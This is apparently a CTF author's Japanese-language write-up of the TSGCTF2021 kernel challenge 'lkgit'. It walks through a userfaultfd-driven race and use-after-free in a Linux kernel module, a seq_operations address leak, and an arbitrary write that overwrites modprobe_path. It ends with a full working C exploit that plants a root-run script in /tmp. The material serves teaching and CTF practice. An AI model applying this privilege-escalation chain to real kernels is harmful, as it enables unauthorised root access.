# lkgit (kernel exploit): author's & community writeups

![](https://i.imgur.com/zfiF2Jd.png)

# イントロ
いつかは忘れましたが、**TSGCTF2021**が開催されました。今年も[Flatt Security](https://flatt.tech/)さんにスポンサーをしていただき開催することができました。ありがとうございます。
今年は院試なりで人生が崩壊していて作問する予定はなく、[mora a.k.a パン人間](https://twitter.com/moratorium08/status/992973579108081666?s=20)さんが全pwnを作問するかと思われましたが、作問してない&&参加できないCTFを見守るのはつまらないため、1問作りました。
作ったのはpwnのkernel問題**lkgit**で、想定難易度medium、最終得点322pts、最終solve数7(`zer0pts`/`./Vespiary`/`hxp`/`Tokyowesterns`/`Super Guesser`/`L00P3R`/`DSGS4T`)、first-bloodは[zer0pts](https://www.zer0pts.com)(公開後約2h)となりました。TSGは難易度想定及び告知の仕方を間違えているという意見をたまに聞きますが、ぼくもそう思います。しかしpwn勢に限ってはどのチームでも例外なく、皆一概に良心であり、性格が良く、朝は早く起き、一汁三菜を基本とした健全な食生活を送り、日々運動を欠かさない、とても素晴らしい人々である事であることが知られています(対極を成すのがcrypto勢です。すいません、嘘です。cryptoも良い魔法使いばかりです)。よって、この問題も作問方針やレビューを受けて適切に難易度づけしました。
作問方針は、「kernel問題でeasyな問題があってもいいじゃないか。但し全部コピペはダメだよ！ほんの少しパズル要素があって、でもストレスフルで冗長なのは嫌！」です。一般にpwnのuserlandのbeginner問はオーバーフローなりOOBなりが出題されますが、それと同程度とまでは行かずとも典型的で解きやすい問題を設定しました。かといって、コピペはだめなので要点要点で自分でちゃんと考える必要のある問題にしたつもりです。kernel問の中ではかなりeasyな部類で、まぁkernel特有の面倒臭さを若干考慮してmediumにしました。
おそらく`cHeap`や`coffee`は解いたけど、配布ファイルの中にbzImageを見つけてそっとパソコンをそっと閉じた人もいるかもしれませんが、本エントリはlkgitを題材にしたkernel exploit入門的な感じでできる限り丁寧に書こうと思うので、是非手元で試しつつ実際にexploitを動かしてみてください。そしてつよつよになって僕にpwnを教えてください。お願いします。
また、一般にwriteupを書くのは偉いことであり、自分の問題のwriteupを見るのは楽しい事であることが知られているため、他の人が書いたwriteupも最後に載せています。
あと、[Survey](https://forms.gle/zkJtfMFwtpmLrPwb8)は競技終了後の今でも(というか、なんなら1週間後、1ヶ月後、1年後)解答自体は出来るし、繰り返し送信することも可能なので、解き直してみて思ったことでも、この問題のココが嫌いだとかでも、秋田犬が好きだでも何でも良いので、送ってもらえるとチーム全員で泣いて喜んで泣いて反省して来年のTSGCTFが少しだけ良いものになります。


# 配布ファイル
さて、配布された`lkgit.tar.gz`を展開すると、`lkgit`というディレクトリが出てきて、そのディレクトリには再度`lkgit.tar.gz`が入っています。ごめんなさい。kernel問の作問時にはMakefileでtar.gzまで一気に作るのですが、TSGCTFの問題はほぼ全てCTFdへの登録の際に初めてtar.gzするという慣習があるため、2回圧縮してしまいました。勿論配布後に確認したのですが、tarを開いてtarが出てきた時、自分の記憶が一瞬飛んだのかと思ってスルーしてしまいました。まぁ非本質です。
![](https://i.imgur.com/gUV4Gxy.png)

配布ファイルはこんな感じです。
```dist.sh
.
├── bzImage:             kernel image本体. 
    (./bzImage: Linux kernel x86 boot executable bzImage, version 5.10.25 (hack@ash) #1 Fri Oct 1 20:11:36 JST 2021, RO-rootFS, swap_dev 0x3, Normal VGA)
├── rootfs.cpio:         root filesystem
├── run.sh:              QEMUの起動スクリプト
└── src:                 ソースコード達
    ├── client
    │   └── client.c:    clientプログラム。読まなくてもOK.
    ├── include:         kernel/client共通ヘッダファイル
    │   └── lkgit.h
    └── kernel:          LKMソースコード
        └── lkgit.c
```
因みに、カーネルのビルドホストがちゃんといじられていない場合authorの名前が分かってRECON出来る可能性があります。今回は**hack@ash**にしました。
`rootfs.cpio`や`bzImage`の展開・圧縮の仕方等は以下を参考にしてみてください。
https://github.com/smallkirby/snippet/blob/master/exploit/kernel/extract.sh
https://github.com/smallkirby/snippet/blob/master/exploit/kernel/extract-vmlinux.sh
https://github.com/smallkirby/snippet/blob/master/exploit/kernel/mr.sh

以下のスクリプトを使って起動すると、なんかいい感じにファイルシステムを展開したり圧縮したりしてQEMUを立ち上げてくれるので、中身を書き換えたいときには便利です。
```mr.sh
#!/bin/bash

filesystem="rootfs.cpio"
extracted="./extracted"

extract_filesystem() {
  mkdir $extracted 
  cd $extracted 
  cpio -idv < "../$filesystem"
  cd ../
}

# extract filesystem if not exists
! [ -d "./extracted" ] && extract_filesystem

# compress
rm $filesystem 
chmod 777 -R $extracted
cd $extracted
find ./ -print0 | cpio --owner root --null -o -H newc > ../rootfs.cpio
cd ../

# run
sh ./run.sh
```

起動してみると、サンプルとなるクライアントプログラムが置いてあります。このクライアントプログラムは、ソースコードに書いてあるとおりexploitに実際は必要がありませんが、モジュールの大まかな意図した動作を把握させる他、exploitにそのまま使えるutility関数を提供する目的で添付しました。クライアントプログラム(そしてそのままLKM自体)の大まかな機能は以下の通りで、ファイルのハッシュ値の取得、及びハッシュ値からlogをたどったりlogを修正することができます。
![](https://i.imgur.com/MXdaKY9.png)

# let's debug
さてさてデバッグですが、`run.sh`に`-s`オプションをつけることでQEMUがGDB serverを建ててくれるため、あとはGDB側から`attach`するだけです。但し、僕の環境ではkernelのデバッグで`pwndbg`を使うとステップ実行に異常時間を食うため、いつもバニラを使っています。以下の`.gdbinit`を参考にして心地よい環境を作ってみてください。
https://github.com/smallkirby/dotfiles/blob/master/gdb/.gdbinit

但し、シンボル情報はないためrootでログインして`/proc/kallsyms`からシンボルを読んでデバッグしてください。この際、`run.sh`と`init`に以下のような変更をすると良いです。

```diff.diff
# init
34,35c34,35
< echo 2 > /proc/sys/kernel/kptr_restrict
< echo 1 > /proc/sys/kernel/dmesg_restrict
---
> echo 0 > /proc/sys/kernel/kptr_restrict
> echo 0 > /proc/sys/kernel/dmesg_restrict
43c43,44
< setsid cttyhack setuidgid user sh
---
> #setsid cttyhack setuidgid user sh
> setsid cttyhack setuidgid root sh

# run.sh
7c7
<   -append "console=ttyS0 oops=panic panic=1 quiet" \
---
>   -append "console=ttyS0 panic=1" \
8a9
>   -s \
```

# Vuln: race condition
さて、今回の脆弱性は明らかでrace-conditionが存在します。kernel問題では、`copy_from_user()`や`copy_to_user()`関数等でユーザランドとデータのやり取りを行う前に、ユーザランドのメモリに対して`userfaultfd`というシスコールで監視を行うことで、登録したユーザランドのハンドラをフォルト時に呼ばせることができます。`mmap`で確保したページは、最初はzero-pageに無条件でマップされているため、初めてのwrite-accessが発生した場合にフォルトが起きます(あと最近のuserfaultfdではwrite-protectedなページに対するハンドラを設定することも可能になっています)。このへんのテクニックの原理・詳細については以下のリポジトリに置いているため気になる人は見てみてください。
https://github.com/smallkirby/kernelpwn/blob/master/technique/userfualtfd.md

さて、本問題においては`lkgit_get_object()`関数でコミットオブジェクトを取得する際に、kernellandからuserlandへのコピーが複数回発生します。よって、ここでフォルトを起こしてkernel threadの処理を停止し、ユーザランドに処理を移すことができます。

```lkgit.c
static long lkgit_get_object(log_object *req) {
	long ret = -LKGIT_ERR_OBJECT_NOTFOUND;
	char hash_other[HASH_SIZE] = {0};
	char hash[HASH_SIZE];
	int target_ix;
	hash_object *target;
	if (copy_from_user(hash, req->hash, HASH_SIZE)) // ...1
		goto end;

	if ((target_ix = find_by_hash(hash)) != -1) {
		target = objects[target_ix];      ...★1
		if (copy_to_user(req->content, target->content, FILE_MAXSZ)) // ...2
			goto end;

		// validity check of hash
		get_hash(target->content, hash_other);
		if (memcmp(hash, hash_other, HASH_SIZE) != 0)
			goto end;

		if (copy_to_user(req->message, target->message, MESSAGE_MAXSZ)) // ...3
			goto end;
		if (copy_to_user(req->hash, target->hash, HASH_SIZE))  // ...4
			goto end;
		ret = 0;
	}

end:
	return ret;
}
```

それとは別に、新しくcommitオブジェクトを作る`lkgit_hash_object()`において、hash値が衝突すると古い方のオブジェクトが`kfree()`されるようになっています。まぁ、hashの衝突と言っても同じファイル(文字列)を渡せばいいだけなのでなんてことはありません。本当はほんもののgitっぽくSHA-1使って、commitオブジェクトとtreeオブジェクトとか分けて・・・とか考えていたんですが、ソースコードが異常量になったので辞めました。あくまで今回のテーマは、おおよそ典型的だが要所で自分で考えなくてはいけないストレスレスな問題なので。

```lkgit.c
static long save_object(hash_object *obj) {
	int ix;
	int dup_ix;
	// first, find conflict of hash
	if((dup_ix = find_by_hash(obj->hash)) != -1) {
		kfree(objects[dup_ix]);
		objects[dup_ix] = NULL;
	}
	// assign object
	for (ix = 0; ix != HISTORY_MAXSZ; ++ix) {
		if (objects[ix] == NULL) {
			objects[ix] = obj;
			return 0;
		}
	}
	return -LKGIT_ERR_UNKNOWN;
}
```

さて、kfreeとレースが組み合わさった時`kUAF`をまず考えます。get関数で処理を止めている間に処理を止めて、フォルトハンドラの中でhash値が重複するオブジェクトを作成すると、そのオブジェクトが削除されます。しかし、このオブジェクトのアドレスは★1でスタックに積まれているため、その状態でgetをresumeさせると、`kfree()`されたアドレスを使い続けることになりkUAFが成立します。


# uffd using structure on the edge of two-pages
kUAFが出来たので、この構造体と同じサイズを持つkernelland構造体を新たに確保して`kfree`されたオブジェクトの上に乗っけましょう。
```lkgit.h
typedef struct {
  char hash[HASH_SIZE];
  char *content;
  char *message;
} hash_object;
```
構造体のサイズは0x20なので`seq_operations`が使えますね。いい加減これを使うのも飽きたので他の構造体を使ってSMEP/SMAPを回避させても良かったんですが、めんどくさくなるだけっぽかったので`seq_operations + modprobe_path`で行けるようにしました。`seq_operations`の確保の仕方は[このへん](https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628)を参考にしてください。また、uffdを使ったexploitのテンプレについては以下を参考にしてください。
https://github.com/smallkirby/snippet/blob/master/exploit/kernel/userfaultfd-exploit.c

但し、上の通りにやっても恐らくleakには失敗すると思います。ここがkernel問題に慣れている人にとって多分唯一の一瞬だけ立ち止まる場所だと思います。get関数を見返してみると、userlandへアクセスを行う箇所が4箇所有ることが分かると思います。問題はどこでフォルトを起こして処理を止めるとleakができるかです。
1. 取得するlogのhash値自体の取得。この時点では対象オブジェクトの特定自体ができていないため、止めても意味がありません。
2. `content`のコピー。ここで止めた場合、`seq_operations`がコミットオブジェクトの上にかぶさるため、その値はunknownになります。よって、直後に有る謎の`validity_check()`でひっかかって処理が終わってしまいます。よってここで止めるのもなしです。
3. ココで止めた場合、直後にvalidity checkもなく、続くcopyで`hash`からシンボルをleakできるので嬉しいです。
4. ココで止めても、コレ以降コピーがないためleakはできません。

よって、唯一の選択肢は3の`message`のコピーで止めることで、逆を言えばコレ以外で止めてはいけません。しかし、普通にユーザランドで`mmap`したページに何も考えず構造体をおくと、1の時点でフォルトが起きてしまい、うまくleakすることができません。
さて、どうしましょう。といっても、恐らく答えは簡単に思いついて、**構造体を2ページにまたがるように配置し、片方のページにだけフォルトの監視をつければOK**です。

(ここにいけてる図を貼る)


# AAW and modprobe_path overwrite

さて、これでkernbaseのleakができました。任意のシンボルのアドレスが分かったことになります。あとはAAWがほしいところです。ここまでで使っていないのは`lkgit_amend_commit`ですが、これは内部でget関数を呼び出す怪しい関数です。案の定、オブジェクトのアドレスをスタックに積んで保存しちゃっています。なので、ここでgetの間にやはり処理を飛んで`kfree`すれば解放されたオブジェクトに対して書き込みを行うことが出来ます。
```lkgit.c
static long lkgit_amend_message(log_object *reqptr) {
	long ret = -LKGIT_ERR_OBJECT_NOTFOUND;
	char buf[MESSAGE_MAXSZ];
	log_object req = {0};
	int target_ix;
	hash_object *target;
	if(copy_from_user(&req, reqptr->hash, HASH_SIZE))
		goto end;

	if ((target_ix = find_by_hash(req.hash)) != -1) {
		target = objects[target_ix];
		// save message temporarily
		if (copy_from_user(buf, reqptr->message, MESSAGE_MAXSZ))
			goto end;
		// return old information of object
		ret = lkgit_get_object(reqptr);
		// amend message
		memcpy(target->message, buf, MESSAGE_MAXSZ);
	}

	end:
		return ret;
}
```

また、2つの構造体を比較してみると、`message`として確保される領域が`log_object`と同じサイズであることがわかります。
```
#define MESSAGE_MAXSZ             0x20
typedef struct {
  char hash[HASH_SIZE];
  char *content;
  char *message;
} hash_object;
```

最後に、`lkgit_hash_object()`における各バッファの確保順を見てみると以下のようになっています。
```lkgit.c
	char *content_buf = kzalloc(FILE_MAXSZ, GFP_KERNEL);
	char *message_buf = kzalloc(MESSAGE_MAXSZ, GFP_KERNEL);
	hash_object *req = kzalloc(sizeof(hash_object), GFP_KERNEL);
```

よって、amend->get->止める->オブジェクト削除->新しく`log_object`の作成->amend再開とすることで、amendで書き込む対象である`message`を任意のアドレスに向けることが可能です。これでAAWになりました。
ここまできたら、あとはお決まりの`modprobe_path`テクニックによってrootで任意のことが出来ます。`modprobe_path`の悪用については、以下の2点を読むと原理と詳細が解ると思います。
https://github.com/smallkirby/kernelpwn/blob/master/technique/modprobe_path.md
https://github.com/smallkirby/kernelpwn/blob/master/important_config/STATIC_USERMODEHELPER.md

`modprobe_path`のアドレスの特定については以下を参考にしてください。
https://github.com/smallkirby/kernelpwn/blob/master/important_config/KALLSYMS_ALL.md

# full exploit

```exploit.c
/****************
 *
 * Full exploit of lkgit.
 * 
****************/

#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <netinet/in.h>
#include <sched.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/shm.h>

#include "../src/include/lkgit.h"// commands

#define DEV_PATH "/dev/lkgit"   // the path the device is placed
#define ulong unsigned long
#define scu static const unsigned long

#// constants
#define PAGE 0x1000
#define NO_FAULT_ADDR 0xdead0000
#define FAULT_ADDR    0xdead1000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)

// globals
int uffd;
struct uffdio_api uffdio_api;
struct uffdio_register uffdio_register;
int lkgit_fd;
char buf[0x400];
unsigned long len = 2 * PAGE;
void *addr = (void*)NO_FAULT_ADDR;
void *target_addr;
size_t target_len;
int tmpfd[0x300];
int seqfd;
struct sockaddr_in saddr = {0};
struct msghdr socketmsg = {0};
struct iovec iov[1];

ulong single_start;
ulong kernbase;

ulong off_single_start = 0x01adc20;
ulong off_modprobepath = 0x0c3cb20;
// (END globals)


// utils
#define WAIT getc(stdin);
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)
ulong user_cs,user_ss,user_sp,user_rflags;

/** module specific utils **/

char* hash_to_string(char *hash) {
  char *hash_str = calloc(HASH_SIZE * 2 + 1, 1);
  for(int ix = 0; ix != HASH_SIZE; ++ix) {
    sprintf(hash_str + ix*2, "%02lx", (unsigned long)(unsigned char)hash[ix]);
  }
  return hash_str;
}

char* string_to_hash(char *hash_str) {
  char *hash = calloc(HASH_SIZE, 1);
  char buf[3] = {0};
  for(int ix = 0; ix != HASH_SIZE; ++ix) {
    memcpy(buf, &hash_str[ix*2], 2);
    hash[ix] = (char)strtol(buf, NULL, 16);
  }
  return hash;
}

void print_log(log_object *log) {
  printf("HASH   : %s\n", hash_to_string(log->hash));
  printf("MESSAGE: %s\n", log->message);
  printf("CONTENT: \n%s\n", log->content);
}
/** END of module specific utils **/


void *conflict_during_fault(char *content) {
  // commit with conflict of hash
  char content_buf[FILE_MAXSZ] = {0};
  char msg_buf[MESSAGE_MAXSZ] = {0};
  memcpy(content_buf, content, FILE_MAXSZ); // hash became 00000000000...
  hash_object req = {
      .content = content_buf,
      .message = content_buf,
  };
  printf("[.] committing with conflict...: %s\n", content);
  assert(ioctl(lkgit_fd, LKGIT_HASH_OBJECT, &req) == 0);
  printf("[+] hash: %s\n", hash_to_string(req.hash));
}

// userfaultfd-utils
static void* fault_handler_thread(void *arg)
{
  puts("[+] entered fault_handler_thread");

  static struct uffd_msg msg;   // data read from userfaultfd
  //struct uffdio_copy uffdio_copy;
  struct uffdio_range uffdio_range;
  struct uffdio_copy uffdio_copy;
  long uffd = (long)arg;        // userfaultfd file descriptor
  struct pollfd pollfd;         //
  int nready;                   // number of polled events

  // set poll information
  pollfd.fd = uffd;
  pollfd.events = POLLIN;

  // wait for poll
  puts("[+] polling...");
  while(poll(&pollfd, 1, -1) > 0){
    if(pollfd.revents & POLLERR || pollfd.revents & POLLHUP)
      errExit("poll");

    // read an event
    if(read(uffd, &msg, sizeof(msg)) == 0)
      errExit("read");

    if(msg.event != UFFD_EVENT_PAGEFAULT)
      errExit("unexpected pagefault");

    printf("[!] page fault: %p\n", (void*)msg.arg.pagefault.address);

    // Now, another thread is halting. Do my business.
    char content_buf[FILE_MAXSZ] = {0};
    if (target_addr == (void*)NO_FAULT_ADDR) {
      puts("[+] first: seq_operations");
      memset(content_buf, 'A', FILE_MAXSZ);
      conflict_during_fault(content_buf);
      puts("[+] trying to realloc kfreed object...");
      if ((seqfd = open("/proc/self/stat", O_RDONLY)) <= 0) {
        errExit("open seq_operations");
      }

      // trash
      uffdio_range.start = msg.arg.pagefault.address & ~(PAGE - 1);
      uffdio_range.len = PAGE;
      if(ioctl(uffd, UFFDIO_UNREGISTER, &uffdio_range) == -1)
        errExit("ioctl-UFFDIO_UNREGISTER");
    } else {
      printf("[+] target == modprobe_path @ %p\n", (void*)kernbase + off_modprobepath);
      strcpy(content_buf, "/tmp/evil\x00");
      conflict_during_fault(content_buf);

      puts("[+] trying to realloc kfreed object...");
      long *buf = calloc(sizeof(long), sizeof(hash_object) / sizeof(long));
      for (int ix = 0; ix != sizeof(hash_object) / sizeof(long); ++ix) {
        buf[ix] = kernbase + off_modprobepath;
      }

      char content_buf[FILE_MAXSZ] = {0};
      char hash_buf[HASH_SIZE] = {0};
      strcpy(content_buf, "uouo-fish-life\x00");
      hash_object req = {
          .content = content_buf,
          .message = (char*)buf,
      };
      assert(ioctl(lkgit_fd, LKGIT_HASH_OBJECT, &req) == 0);
      printf("[+] hash: %s\n", hash_to_string(req.hash));

      // write evil message
      puts("[+] copying evil message...");
      char message_buf[PAGE] = {0};
      strcpy(message_buf, "/tmp/evil\x00");
      uffdio_copy.src = (unsigned long)message_buf;
      uffdio_copy.dst = msg.arg.pagefault.address;
      uffdio_copy.len = PAGE;
      uffdio_copy.mode = 0;
      if(ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
        errExit("ioctl-UFFDIO_COPY");
    }

    break;
  }

  puts("[+] exiting fault_handler_thrd");
}

void register_userfaultfd_and_halt(void)
{
  puts("[+] registering userfaultfd...");

  long uffd;      // userfaultfd file descriptor
  pthread_t thr;  // ID of thread that handles page fault and continue exploit in another kernel thread
  struct uffdio_api uffdio_api;
  struct uffdio_register uffdio_register;
  int s;

  // create userfaultfd file descriptor
  uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); // there is no wrapper in libc
  if(uffd == -1)
    errExit("userfaultfd");

  // enable uffd object via ioctl(UFFDIO_API)
  uffdio_api.api = UFFD_API;
  uffdio_api.features = 0;
  if(ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
    errExit("ioctl-UFFDIO_API");

  // mmap
  addr = mmap(target_addr, target_len, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0); // set MAP_FIXED for memory to be mmaped on exactly specified addr.
  printf("[+] mmapped @ %p\n", addr);
  if(addr == MAP_FAILED || addr != target_addr)
    errExit("mmap");

  // specify memory region handled by userfaultfd via ioctl(UFFDIO_REGISTER)
  // first step
  if (target_addr == (void*)NO_FAULT_ADDR) {
    uffdio_register.range.start = (size_t)(target_addr + PAGE);
    uffdio_register.range.len = PAGE;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
  } else {
    // second step
    uffdio_register.range.start = (size_t)(target_addr + PAGE);
    uffdio_register.range.len = PAGE;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
  }
  //uffdio_register.mode = UFFDIO_REGISTER_MODE_WP; // write-protection
  if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
    errExit("ioctl-UFFDIO_REGISTER");

  s = pthread_create(&thr, NULL, fault_handler_thread, (void*)uffd);
  if(s!=0){
    errno = s;
    errExit("pthread_create");
  }

  puts("[+] registered userfaultfd");
}
// (END userfaultfd-utils)


int main(int argc, char *argv[])
{
  puts("[.] starting exploit...");
  system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/nirugiri");
  system("echo -ne '#!/bin/sh\nchmod 777 /home/user/flag && cat /home/user/flag' > /tmp/evil");
  system("chmod +x /tmp/evil");
  system("chmod +x /tmp/nirugiri");


  lkgit_fd = open(DEV_PATH, O_RDWR);
	if(lkgit_fd < 0) {
		errExit("open");
	}

  // register uffd handler
  target_addr = (void*)NO_FAULT_ADDR;
  target_len = 2 * PAGE;
  register_userfaultfd_and_halt();
  sleep(1);

  log_object *log = (log_object*)(target_addr + PAGE - (HASH_SIZE + FILE_MAXSZ));
  printf("[.] target addr: %p\n", target_addr);
  printf("[.] log:         %p\n", log);

  // spray
  puts("[.] heap spraying...");
  for (int ix = 0; ix != 0x90; ++ix) {
    tmpfd[ix] = open("/proc/self/stat", O_RDONLY);
  }

  // commit a file normaly
  char content_buf[FILE_MAXSZ] = {0};
  char msg_buf[MESSAGE_MAXSZ] = {0};
  char hash_buf[HASH_SIZE] = {0};
  memset(content_buf, 'A', FILE_MAXSZ); // hash became 00000000000...
  strcpy(msg_buf, "This is normal commit.\x00");
  hash_object req = {
      .content = content_buf,
      .message = msg_buf,
  };
  assert(ioctl(lkgit_fd, LKGIT_HASH_OBJECT, &req) == 0);
  printf("[+] hash: %s\n", hash_to_string(req.hash));

  memset(content_buf, 0, FILE_MAXSZ);
  strcpy(content_buf, "/tmp/evil\x00"); // hash is 46556c00000000000000000000000000
  strcpy(msg_buf, "This is second commit.\x00");
  assert(ioctl(lkgit_fd, LKGIT_HASH_OBJECT, &req) == 0);
  printf("[+] hash: %s\n", hash_to_string(req.hash));


  // try to get a log and invoke race
  // this fault happens when copy_to_user(to = message), not when copy_to_user(to = content).
  memset(log->hash, 0, HASH_SIZE);
  assert(ioctl(lkgit_fd, LKGIT_GET_OBJECT, log) == 0);
  print_log(log);

  // kernbase leak
  single_start = *(unsigned long*)log->hash;
  kernbase = single_start - off_single_start;
  printf("[!] single_start: %lx\n", single_start);
  printf("[!] kernbase: %lx\n", kernbase);

  // prepare for race again.
  target_len = PAGE * 2;
  target_addr = (void*)NO_FAULT_ADDR + PAGE*2;
  register_userfaultfd_and_halt();
  sleep(1);

  // amend to race/AAW
  log = (log_object *)(target_addr + PAGE - (HASH_SIZE + FILE_MAXSZ));
  memcpy(log->hash, string_to_hash("46556c00000000000000000000000000"), HASH_SIZE); // hash is 46556c00000000000000000000000000
  puts("[.] trying to race to achive AAW...");
  int e = ioctl(lkgit_fd, LKGIT_AMEND_MESSAGE, log);
  if (e != 0) {
    if (e == -LKGIT_ERR_OBJECT_NOTFOUND) {
      printf("[ERROR] object not found: %s\n", hash_to_string(log->hash));
    } else {
      printf("[ERROR] unknown error in AMEND.\n");
    }
  }
 
  // nirugiri
  puts("[!] executing evil script...");
  system("/tmp/nirugiri");
  system("cat /home/user/flag");

  printf("[.] end of exploit.\n");
  return 0;
}
```

今回は`wget`こそ入っているもののネットワークモジュールが実装されていないため使えません。これはコンフィグ変にいじってデカ重になったりビルドし直したりするのが嫌だったのでこのままにしておきました。まぁBASE64で送るだけなので、大変さはそんなじゃないと思っています。送り方がわからない人は以下を見てください。
https://github.com/smallkirby/snippet/blob/master/exploit/kernel/sender.py


# Community Writeups
解いてくれた人・復習してやってくれた人のブログとかwriteupを集めます。(ただ、軽く見た感じlkgitは触ってくれた人自体がとても少ないみたいでwriteupも見つからず、わんわん泣いています。chatにジェラってます。まぁchat良い問題だからそれはそうなんですが)

**TBD**

# アウトロ
![](https://i.imgur.com/tkJtAbD.png)

今回はkernel問のイントロ的に作ってみました。leakのあとはheap問にしたりSMEP/SMAPを回避させるバージョンも考えましたが、素直じゃないので辞めました。一応(慣れている人にとって面白いかどうかは別として)とっつきやすい問題になっていると思います。次はもっと勉強して問題解いていいのを作りたいです。あと、twitterもDiscordも`chat`一色になっていて大泣きしています。
lkgitに関して不明点等合った場合は、[Twitter](https://twitter.com/smallkirby)かDiscordのDMで聞いてください。
何はともあれ、TSGCTF2020終わりです。また来年、少しだけ成長して会いましょう。


# 参考
ニルギリ
https://youtu.be/yvUvamhYPHw
